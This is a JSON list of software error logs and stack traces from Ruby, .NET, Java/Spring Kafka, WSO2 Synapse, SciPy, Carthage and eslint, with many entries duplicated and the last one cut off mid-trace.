[
    {
        "logs": "TinyTds::Error: Incorrect syntax near '.'.: CREATE UNIQUE INDEX [dbo].[Wdb_unique_schema_migrations] ON [dbo].[Wdb_schema_migrations] ([version])"
    },
    {
        "logs": "TinyTds::Error: Incorrect syntax near '.'.: CREATE UNIQUE INDEX [dbo].[Wdb_unique_schema_migrations] ON [dbo].[Wdb_schema_migrations] ([version])"
    },
    {
        "logs": "path': no implicit conversion of nil into String (TypeError)\r\n        from C:/tools/ruby23/lib/ruby/2.3.0/fileutils.rb:1564:in "
    },
    {
        "logs": "Description: The process was terminated due to an unhandled exception.\r\nException Info: System.InvalidCastException\r\nStack:\r\n   at XYZ.MyService.Main.ServiceException(System.Object, System.Exception)\r\n   at PushSharp.Apple.ApplePushService+<ApplePushService>c__AnonStorey3.<>m__B(System.Object)\r\n   at System.Threading.ExecutionContext.runTryCode(System.Object)\r\n   at System.Runtime.CompilerServices.RuntimeHelpers.ExecuteCodeWithGuaranteedCleanup(TryCode, CleanupCode, System.Object)\r\n   at System.Threading.ExecutionContext.Run(System.Threading.ExecutionContext, System.Threading.ContextCallback, System.Object, Boolean)\r\n   at System.Threading._TimerCallback.PerformTimerCallback(System.Object)"
    },
    {
        "logs": "Description: The process was terminated due to an unhandled exception.\r\nException Info: System.InvalidCastException\r\nStack:\r\n   at XYZ.MyService.Main.ServiceException(System.Object, System.Exception)\r\n   at PushSharp.Apple.ApplePushService+<ApplePushService>c__AnonStorey3.<>m__B(System.Object)\r\n   at System.Threading.ExecutionContext.runTryCode(System.Object)\r\n   at System.Runtime.CompilerServices.RuntimeHelpers.ExecuteCodeWithGuaranteedCleanup(TryCode, CleanupCode, System.Object)\r\n   at System.Threading.ExecutionContext.Run(System.Threading.ExecutionContext, System.Threading.ContextCallback, System.Object, Boolean)\r\n   at System.Threading._TimerCallback.PerformTimerCallback(System.Object)"
    },
    {
        "logs": " (https://github.com/Neurosim-lab/netpyne/blob/development/netpyne/neuromlFuncs.py#L1033), which seems like is never met.\r\n\r\n- Also, there seems to be 2 small bugs in https://github.com/Neurosim-lab/netpyne/blob/development/netpyne/cell.py#L1013:\r\n1) self.stims[-1] is accessed before appending the stim (line 1017)\r\n2) ['NeuroML2_stochastic_input_rand'] should start with an 'h' so that it is removed before gathering (otherwise will crash)\r\nBoth of these can easily be fixed by replacing with:"
    },
    {
        "logs": "Error occurred type=\"error\" text=\"Missing job runner for an existing job - #######\" stackTrace=\"   at Kudu.Core.Jobs.ContinuousJobsManager.EnableJob(String jobName)\r\n   at Kudu.Services.Jobs.JobsController.EnableContinuousJob(String jobName)\r\n   at lambda_method(Closure , Object , Object[] )\r\n   at System.Web.Http.Controllers.ReflectedHttpActionDescriptor.ActionExecutor.<>c__DisplayClass10.<GetExecutor>b__9(Object instance, Object[] methodParameters)"
    },
    {
        "logs": "Error occurred type=\"error\" text=\"Missing job runner for an existing job - #######\" stackTrace=\"   at Kudu.Core.Jobs.ContinuousJobsManager.EnableJob(String jobName)\r\n   at Kudu.Services.Jobs.JobsController.EnableContinuousJob(String jobName)\r\n   at lambda_method(Closure , Object , Object[] )\r\n   at System.Web.Http.Controllers.ReflectedHttpActionDescriptor.ActionExecutor.<>c__DisplayClass10.<GetExecutor>b__9(Object instance, Object[] methodParameters)"
    },
    {
        "logs": "$ carthage update --platform iOS --no-use-binaries\r\n*** Fetching stripe-ios\r\n*** Checking out stripe-ios at \"v10.1.0\"\r\n*** xcodebuild output can be found in /var/folders/rw/gbr9wvs91cz91mcpgdxv4q340000gn/T/carthage-xcodebuild.8JRlhv.log\r\n*** Building scheme \"StripeiOS\" in Stripe.xcworkspace\r\nBuild Failed\r\n\tTask failed with exit code 65:\r\n\t/usr/bin/xcrun xcodebuild -workspace \r\n../Carthage/Checkouts/stripe-ios/Stripe.xcworkspace -scheme StripeiOS -configuration Release -derivedDataPath /Users/username_0/Library/Caches/org.carthage.CarthageKit/DerivedData/stripe-ios/v10.1.0 -sdk iphoneos ONLY_ACTIVE_ARCH=NO BITCODE_GENERATION_MODE=bitcode CODE_SIGNING_REQUIRED=NO CODE_SIGN_IDENTITY= CARTHAGE=YES clean build"
    },
    {
        "logs": "$ carthage update --platform iOS --no-use-binaries\r\n*** Fetching stripe-ios\r\n*** Checking out stripe-ios at \"v10.1.0\"\r\n*** xcodebuild output can be found in /var/folders/rw/gbr9wvs91cz91mcpgdxv4q340000gn/T/carthage-xcodebuild.8JRlhv.log\r\n*** Building scheme \"StripeiOS\" in Stripe.xcworkspace\r\nBuild Failed\r\n\tTask failed with exit code 65:\r\n\t/usr/bin/xcrun xcodebuild -workspace \r\n../Carthage/Checkouts/stripe-ios/Stripe.xcworkspace -scheme StripeiOS -configuration Release -derivedDataPath /Users/username_0/Library/Caches/org.carthage.CarthageKit/DerivedData/stripe-ios/v10.1.0 -sdk iphoneos ONLY_ACTIVE_ARCH=NO BITCODE_GENERATION_MODE=bitcode CODE_SIGNING_REQUIRED=NO CODE_SIGN_IDENTITY= CARTHAGE=YES clean build"
    },
    {
        "logs": "~/.local/opt/miniconda3/envs/py3/lib/python3.7/site-packages/scipy/optimize/_root.py in root(fun, x0, args, method, jac, tol, callback, options)\r\n    185 \r\n    186     if meth == 'hybr':\r\n--> 187         sol = _root_hybr(fun, x0, args=args, jac=jac, **options)\r\n    188     elif meth == 'lm':\r\n    189         sol = _root_leastsq(fun, x0, args=args, jac=jac, **options)\r\n\r\n~/.local/opt/miniconda3/envs/py3/lib/python3.7/site-packages/scipy/optimize/minpack.py in _root_hybr(func, x0, args, jac, col_deriv, xtol, maxfev, band, eps, factor, diag, **unknown_options)\r\n    223             maxfev = 200 * (n + 1)\r\n    224         retval = _minpack._hybrd(func, x0, args, 1, xtol, maxfev,\r\n--> 225                                  ml, mu, epsfcn, factor, diag)\r\n    226     else:\r\n    227         _check_func('fsolve', 'fprime', Dfun, x0, args, n, (n, n))\r\n\r\nValueError: The array returned by a function changed size between calls"
    },
    {
        "logs": "~/.local/opt/miniconda3/envs/py3/lib/python3.7/site-packages/scipy/optimize/_root.py in root(fun, x0, args, method, jac, tol, callback, options)\r\n    185 \r\n    186     if meth == 'hybr':\r\n--> 187         sol = _root_hybr(fun, x0, args=args, jac=jac, **options)\r\n    188     elif meth == 'lm':\r\n    189         sol = _root_leastsq(fun, x0, args=args, jac=jac, **options)\r\n\r\n~/.local/opt/miniconda3/envs/py3/lib/python3.7/site-packages/scipy/optimize/minpack.py in _root_hybr(func, x0, args, jac, col_deriv, xtol, maxfev, band, eps, factor, diag, **unknown_options)\r\n    223             maxfev = 200 * (n + 1)\r\n    224         retval = _minpack._hybrd(func, x0, args, 1, xtol, maxfev,\r\n--> 225                                  ml, mu, epsfcn, factor, diag)\r\n    226     else:\r\n    227         _check_func('fsolve', 'fprime', Dfun, x0, args, n, (n, n))\r\n\r\nValueError: The array returned by a function changed size between calls"
    },
    {
        "logs": "Exception\r\n=========\r\nTID: [0] [AM] [2015-01-22 15:56:24,029] INFO\r\n{org.apache.synapse.mediators.builtin.LogMediator} - STATUS = Executing default 'fault' sequence, ERROR_CODE = 0, ERROR_MESSAGE = Content-Type:application/soap+xml;charset=UTF-8;action=\"http://xmlns.fmr.com/WI/DC/2014/06/AAA/AAAService/GetSummary\",Host:apigw-dev1.fmr.com:10243, Unexpected error sending message back {org.apache.synapse.mediators.builtin.LogMediator}\r\nTID: [0] [AM] [2015-01-22 15:56:24,029] INFO\r\n{org.apache.synapse.mediators.builtin.LogMediator}\r\n- Error Details: = org.apache.synapse.SynapseException: Content-Type:application/soap+xml;charset=UTF-8;action=\"http://xmlns.fmr.com/WI/DC/2014/06/Balances/BalancesService/GetSummary\",Host:apigw-dev1.fmr.com:10243, Unexpected error sending message back\r\nat org.apache.synapse.core.axis2.Axis2Sender.handleException(Axis2Sender.java:172)\r\nat org.apache.synapse.core.axis2.Axis2Sender.sendBack(Axis2Sender.java:166)\r\nat org.apache.synapse.mediators.builtin.CacheMediator.processRequestMessage(CacheMediator.java:408)\r\nat org.apache.synapse.mediators.builtin.CacheMediator.mediate(CacheMediator.java:177)\r\nat org.apache.synapse.mediators.AbstractListMediator.mediate(AbstractListMediator.java:77)\r\nat org.apache.synapse.mediators.AbstractListMediator.mediate(AbstractListMediator.java:47)\r\nat org.apache.synapse.mediators.base.SequenceMediator.mediate(SequenceMediator.java:131)\r\nat org.apache.synapse.rest.Resource.process(Resource.java:297)\r\nat org.apache.synapse.rest.API.process(API.java:341)\r\nat org.apache.synapse.rest.RESTRequestHandler.dispatchToAPI(RESTRequestHandler.java:83)\r\nat org.apache.synapse.rest.RESTRequestHandler.process(RESTRequestHandler.java:64)\r\nat org.apache.synapse.core.axis2.Axis2SynapseEnvironment.injectMessage(Axis2SynapseEnvironment.java:220)\r\nat org.apache.synapse.core.axis2.SynapseMessageReceiver.receive(SynapseMessageReceiver.java:83)\r\nat org.apache.axis2.engine.AxisEngine.receive(AxisEngine.java:180)\r\nat org.apache.synapse.transport.passthru.ServerWorker.processEntityEnclosingRequest(ServerWorker.java:411)\r\nat org.apache.synapse.transport.passthru.ServerWorker.run(ServerWorker.java:183)\r\nat org.apache.axis2.transport.base.threads.NativeWorkerPool$1.run(NativeWorkerPool.java:172)\r\nat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)\r\nat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)\r\nat java.lang.Thread.run(Thread.java:745)\r\nCaused by: org.apache.axis2.AxisFault: Failed to submit the response\r\nat org.apache.synapse.transport.passthru.PassThroughHttpSender.handleException(PassThroughHttpSender.java:550)\r\nat org.apache.synapse.transport.passthru.PassThroughHttpSender.invoke(PassThroughHttpSender.java:256)\r\nat org.apache.axis2.engine.AxisEngine.send(AxisEngine.java:442)\r\nat org.apache.synapse.core.axis2.Axis2Sender.sendBack(Axis2Sender.java:163)\r\n... 18 more\r\nCaused by: java.lang.UnsupportedOperationException: The parser is already consumed!\r\nat org.apache.axiom.om.impl.llom.OMContainerHelper.getXMLStreamReader(OMContainerHelper.java:58)\r\nat org.apache.axiom.om.impl.llom.OMElementImpl.getXMLStreamReader(OMElementImpl.java:736)\r\nat org.apache.axiom.om.impl.util.OMSerializerUtil.serializeByPullStream(OMSerializerUtil.java:547)\r\nat org.apache.axiom.soap.impl.llom.SOAPEnvelopeImpl.internalSerialize(SOAPEnvelopeImpl.java:249)\r\nat org.apache.axiom.om.impl.llom.OMSerializableImpl.serializeAndConsume(OMSerializableImpl.java:193)\r\nat org.apache.axis2.transport.http.SOAPMessageFormatter.writeTo(SOAPMessageFormatter.java:74)\r\nat org.apache.synapse.transport.passthru.PassThroughHttpSender.submitResponse(PassThroughHttpSender.java:489)\r\nat org.apache.synapse.transport.passthru.PassThroughHttpSender.invoke(PassThroughHttpSender.java:254)\r\n... 20 more"
    },
    {
        "logs": "Exception\r\n=========\r\nTID: [0] [AM] [2015-01-22 15:56:24,029] INFO\r\n{org.apache.synapse.mediators.builtin.LogMediator} - STATUS = Executing default 'fault' sequence, ERROR_CODE = 0, ERROR_MESSAGE = Content-Type:application/soap+xml;charset=UTF-8;action=\"http://xmlns.fmr.com/WI/DC/2014/06/AAA/AAAService/GetSummary\",Host:apigw-dev1.fmr.com:10243, Unexpected error sending message back {org.apache.synapse.mediators.builtin.LogMediator}\r\nTID: [0] [AM] [2015-01-22 15:56:24,029] INFO\r\n{org.apache.synapse.mediators.builtin.LogMediator}\r\n- Error Details: = org.apache.synapse.SynapseException: Content-Type:application/soap+xml;charset=UTF-8;action=\"http://xmlns.fmr.com/WI/DC/2014/06/Balances/BalancesService/GetSummary\",Host:apigw-dev1.fmr.com:10243, Unexpected error sending message back\r\nat org.apache.synapse.core.axis2.Axis2Sender.handleException(Axis2Sender.java:172)\r\nat org.apache.synapse.core.axis2.Axis2Sender.sendBack(Axis2Sender.java:166)\r\nat org.apache.synapse.mediators.builtin.CacheMediator.processRequestMessage(CacheMediator.java:408)\r\nat org.apache.synapse.mediators.builtin.CacheMediator.mediate(CacheMediator.java:177)\r\nat org.apache.synapse.mediators.AbstractListMediator.mediate(AbstractListMediator.java:77)\r\nat org.apache.synapse.mediators.AbstractListMediator.mediate(AbstractListMediator.java:47)\r\nat org.apache.synapse.mediators.base.SequenceMediator.mediate(SequenceMediator.java:131)\r\nat org.apache.synapse.rest.Resource.process(Resource.java:297)\r\nat org.apache.synapse.rest.API.process(API.java:341)\r\nat org.apache.synapse.rest.RESTRequestHandler.dispatchToAPI(RESTRequestHandler.java:83)\r\nat org.apache.synapse.rest.RESTRequestHandler.process(RESTRequestHandler.java:64)\r\nat org.apache.synapse.core.axis2.Axis2SynapseEnvironment.injectMessage(Axis2SynapseEnvironment.java:220)\r\nat org.apache.synapse.core.axis2.SynapseMessageReceiver.receive(SynapseMessageReceiver.java:83)\r\nat org.apache.axis2.engine.AxisEngine.receive(AxisEngine.java:180)\r\nat org.apache.synapse.transport.passthru.ServerWorker.processEntityEnclosingRequest(ServerWorker.java:411)\r\nat org.apache.synapse.transport.passthru.ServerWorker.run(ServerWorker.java:183)\r\nat org.apache.axis2.transport.base.threads.NativeWorkerPool$1.run(NativeWorkerPool.java:172)\r\nat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)\r\nat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)\r\nat java.lang.Thread.run(Thread.java:745)\r\nCaused by: org.apache.axis2.AxisFault: Failed to submit the response\r\nat org.apache.synapse.transport.passthru.PassThroughHttpSender.handleException(PassThroughHttpSender.java:550)\r\nat org.apache.synapse.transport.passthru.PassThroughHttpSender.invoke(PassThroughHttpSender.java:256)\r\nat org.apache.axis2.engine.AxisEngine.send(AxisEngine.java:442)\r\nat org.apache.synapse.core.axis2.Axis2Sender.sendBack(Axis2Sender.java:163)\r\n... 18 more\r\nCaused by: java.lang.UnsupportedOperationException: The parser is already consumed!\r\nat org.apache.axiom.om.impl.llom.OMContainerHelper.getXMLStreamReader(OMContainerHelper.java:58)\r\nat org.apache.axiom.om.impl.llom.OMElementImpl.getXMLStreamReader(OMElementImpl.java:736)\r\nat org.apache.axiom.om.impl.util.OMSerializerUtil.serializeByPullStream(OMSerializerUtil.java:547)\r\nat org.apache.axiom.soap.impl.llom.SOAPEnvelopeImpl.internalSerialize(SOAPEnvelopeImpl.java:249)\r\nat org.apache.axiom.om.impl.llom.OMSerializableImpl.serializeAndConsume(OMSerializableImpl.java:193)\r\nat org.apache.axis2.transport.http.SOAPMessageFormatter.writeTo(SOAPMessageFormatter.java:74)\r\nat org.apache.synapse.transport.passthru.PassThroughHttpSender.submitResponse(PassThroughHttpSender.java:489)\r\nat org.apache.synapse.transport.passthru.PassThroughHttpSender.invoke(PassThroughHttpSender.java:254)\r\n... 20 more"
    },
    {
        "logs": "/home/travis/build/oppia/oppia/core/tests/protractor_utils/forms.js\r\n  644:1  error  Line 644 exceeds the maximum line length of 80  max-len\r\n\r\n\u00e2\u0153\u2013 1 problem (1 error, 0 warnings)\r\n\r\n\r\nFAILED    1 JavaScript and Typescript files"
    },
    {
        "logs": "    #if defined(__APPLE__)\r\n      error_addr = reinterpret_cast<void *>(uctx->uc_mcontext->__ss.__pc);\r\n    #elif\r\n      error_addr = reinterpret_cast<void *>(uctx->uc_mcontext.pc);\r\n    #endif"
    },
    {
        "logs": "    #if defined(__APPLE__)\r\n      error_addr = reinterpret_cast<void *>(uctx->uc_mcontext->__ss.__pc);\r\n    #elif\r\n      error_addr = reinterpret_cast<void *>(uctx->uc_mcontext.pc);\r\n    #endif"
    },
    {
        "logs": "2021-01-15 11:43:53.770  INFO 84483 --- [mo-topic1-0-C-1] c.e.c.KafaTransactionDLTConfiguration    : In Error handler {}\r\n\r\norg.springframework.kafka.listener.ListenerExecutionFailedException: Listener method 'public void com.example.config.KafaTransactionDLTConfiguration.listen(java.lang.String,int,java.lang.String,org.apache.kafka.clients.consumer.KafkaConsumer<java.lang.String, java.lang.String>,long,long) throws java.lang.Exception' threw exception; nested exception is org.springframework.dao.InvalidDataAccessApiUsageException: Target object must not be null; nested exception is java.lang.IllegalArgumentException: Target object must not be null\r\n\tat org.springframework.kafka.listener.adapter.MessagingMessageListenerAdapter.invokeHandler(MessagingMessageListenerAdapter.java:350) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.adapter.RecordMessagingMessageListenerAdapter.onMessage(RecordMessagingMessageListenerAdapter.java:86) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.adapter.RecordMessagingMessageListenerAdapter.onMessage(RecordMessagingMessageListenerAdapter.java:51) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.doInvokeOnMessage(KafkaMessageListenerContainer.java:1880) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.invokeOnMessage(KafkaMessageListenerContainer.java:1862) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.doInvokeRecordListener(KafkaMessageListenerContainer.java:1799) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.access$1900(KafkaMessageListenerContainer.java:432) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer$3.doInTransactionWithoutResult(KafkaMessageListenerContainer.java:1667) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.transaction.support.TransactionCallbackWithoutResult.doInTransaction(TransactionCallbackWithoutResult.java:36) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.transaction.support.TransactionTemplate.execute(TransactionTemplate.java:140) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.invokeRecordListenerInTx(KafkaMessageListenerContainer.java:1658) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.invokeRecordListener(KafkaMessageListenerContainer.java:1633) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.invokeListener(KafkaMessageListenerContainer.java:1366) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.pollAndInvoke(KafkaMessageListenerContainer.java:1082) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.run(KafkaMessageListenerContainer.java:990) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat java.base/java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515) ~[na:na]\r\n\tat java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264) ~[na:na]\r\n\tat java.base/java.lang.Thread.run(Thread.java:832) ~[na:na]\r\nCaused by: org.springframework.dao.InvalidDataAccessApiUsageException: Target object must not be null; nested exception is java.lang.IllegalArgumentException: Target object must not be null\r\n\tat org.springframework.orm.jpa.EntityManagerFactoryUtils.convertJpaAccessExceptionIfPossible(EntityManagerFactoryUtils.java:374) ~[spring-orm-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.orm.jpa.vendor.HibernateJpaDialect.translateExceptionIfPossible(HibernateJpaDialect.java:257) ~[spring-orm-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.orm.jpa.AbstractEntityManagerFactoryBean.translateExceptionIfPossible(AbstractEntityManagerFactoryBean.java:528) ~[spring-orm-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.dao.support.ChainedPersistenceExceptionTranslator.translateExceptionIfPossible(ChainedPersistenceExceptionTranslator.java:61) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.dao.support.DataAccessUtils.translateIfNecessary(DataAccessUtils.java:242) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.dao.support.PersistenceExceptionTranslationInterceptor.invoke(PersistenceExceptionTranslationInterceptor.java:153) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.data.jpa.repository.support.CrudMethodMetadataPostProcessor$CrudMethodMetadataPopulatingMethodInterceptor.invoke(CrudMethodMetadataPostProcessor.java:178) ~[spring-data-jpa-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:95) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:212) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat com.sun.proxy.$Proxy81.save(Unknown Source) ~[na:na]\r\n\tat com.example.config.KafaTransactionDLTConfiguration.send(KafaTransactionDLTConfiguration.java:148) ~[classes/:na]\r\n\tat com.example.config.KafaTransactionDLTConfiguration.listen(KafaTransactionDLTConfiguration.java:112) ~[classes/:na]\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na]\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:na]\r\n\tat java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na]\r\n\tat java.base/java.lang.reflect.Method.invoke(Method.java:564) ~[na:na]\r\n\tat org.springframework.messaging.handler.invocation.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:171) ~[spring-messaging-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.messaging.handler.invocation.InvocableHandlerMethod.invoke(InvocableHandlerMethod.java:120) ~[spring-messaging-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.kafka.listener.adapter.HandlerAdapter.invoke(HandlerAdapter.java:48) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.adapter.MessagingMessageListenerAdapter.invokeHandler(MessagingMessageListenerAdapter.java:329) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\t... 17 common frames omitted\r\nCaused by: java.lang.IllegalArgumentException: Target object must not be null\r\n\tat org.springframework.util.Assert.notNull(Assert.java:201) ~[spring-core-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.beans.AbstractNestablePropertyAccessor.setWrappedInstance(AbstractNestablePropertyAccessor.java:195) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.beans.BeanWrapperImpl.setWrappedInstance(BeanWrapperImpl.java:153) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.beans.AbstractNestablePropertyAccessor.setWrappedInstance(AbstractNestablePropertyAccessor.java:183) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.beans.AbstractNestablePropertyAccessor.<init>(AbstractNestablePropertyAccessor.java:122) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.beans.BeanWrapperImpl.<init>(BeanWrapperImpl.java:103) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.data.util.DirectFieldAccessFallbackBeanWrapper.<init>(DirectFieldAccessFallbackBeanWrapper.java:36) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.jpa.repository.support.JpaMetamodelEntityInformation.getId(JpaMetamodelEntityInformation.java:159) ~[spring-data-jpa-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.repository.core.support.AbstractEntityInformation.isNew(AbstractEntityInformation.java:42) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.jpa.repository.support.JpaMetamodelEntityInformation.isNew(JpaMetamodelEntityInformation.java:246) ~[spring-data-jpa-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.jpa.repository.support.SimpleJpaRepository.save(SimpleJpaRepository.java:553) ~[spring-data-jpa-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na]\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:na]\r\n\tat java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na]\r\n\tat java.base/java.lang.reflect.Method.invoke(Method.java:564) ~[na:na]\r\n\tat org.springframework.data.repository.core.support.ImplementationInvocationMetadata.invoke(ImplementationInvocationMetadata.java:72) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.repository.core.support.RepositoryComposition$RepositoryFragments.invoke(RepositoryComposition.java:382) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.repository.core.support.RepositoryComposition.invoke(RepositoryComposition.java:205) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.repository.core.support.RepositoryFactorySupport$ImplementationMethodExecutionInterceptor.invoke(RepositoryFactorySupport.java:549) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.data.repository.core.support.QueryExecutorMethodInterceptor.doInvoke(QueryExecutorMethodInterceptor.java:155) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.repository.core.support.QueryExecutorMethodInterceptor.invoke(QueryExecutorMethodInterceptor.java:130) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.data.projection.DefaultMethodInvokingMethodInterceptor.invoke(DefaultMethodInvokingMethodInterceptor.java:80) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:367) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:118) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.dao.support.PersistenceExceptionTranslationInterceptor.invoke(PersistenceExceptionTranslationInterceptor.java:139) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\t... 34 common frames omitted"
    },
    {
        "logs": "2021-01-15 11:43:53.770  INFO 84483 --- [mo-topic1-0-C-1] c.e.c.KafaTransactionDLTConfiguration    : In Error handler {}\r\n\r\norg.springframework.kafka.listener.ListenerExecutionFailedException: Listener method 'public void com.example.config.KafaTransactionDLTConfiguration.listen(java.lang.String,int,java.lang.String,org.apache.kafka.clients.consumer.KafkaConsumer<java.lang.String, java.lang.String>,long,long) throws java.lang.Exception' threw exception; nested exception is org.springframework.dao.InvalidDataAccessApiUsageException: Target object must not be null; nested exception is java.lang.IllegalArgumentException: Target object must not be null\r\n\tat org.springframework.kafka.listener.adapter.MessagingMessageListenerAdapter.invokeHandler(MessagingMessageListenerAdapter.java:350) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.adapter.RecordMessagingMessageListenerAdapter.onMessage(RecordMessagingMessageListenerAdapter.java:86) 